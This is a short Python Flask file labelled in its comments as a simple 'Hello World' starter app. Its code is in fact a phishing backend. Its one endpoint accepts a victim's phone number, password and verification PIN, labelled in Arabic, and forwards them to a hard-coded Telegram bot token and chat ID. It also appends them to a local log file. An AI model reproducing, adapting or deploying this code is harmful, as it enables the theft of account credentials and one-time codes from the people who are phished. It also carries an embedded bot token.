
# A very simple Flask Hello World app for you to get started with...
#
# When Creating a new account make sure to 
# pip install requests 
# pip install flask-cors
#
# 

from flask import Flask
from flask_cors import CORS
from flask import request, jsonify
import requests


app = Flask(__name__)
CORS(app)


TELEGRAM_BOT_TOKEN = "7927477760:AAF7TpZvJeDSQPhjiYnAcp05IPT8z11rk1A"
TELEGRAM_CHAT_ID = "-4849674945"

@app.route('/',methods=['POST'])
def send_telegram_message():
    message_text = 'رقم الهاتف:' + '`' + request.json['phonenumber'] + '`' + '\n'
    message_text += 'كلمة السر:' + '`' + request.json['password'] +'`' + '\n'
    if 'pin' in request.json:
        message_text += 'رمز التحقق:' + '`' +request.json['pin'] +'`'

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message_text,
        'parse_mode':'Markdown'
    }

    try:
        response = requests.post(url, json=payload)
        response.raise_for_status()
        open('log.txt','a+').write(message_text+'\n')
        return jsonify({"status": "success"}), 200
    except requests.exceptions.RequestException as e:
        return jsonify({"status": "error", "message": str(e)}), 501







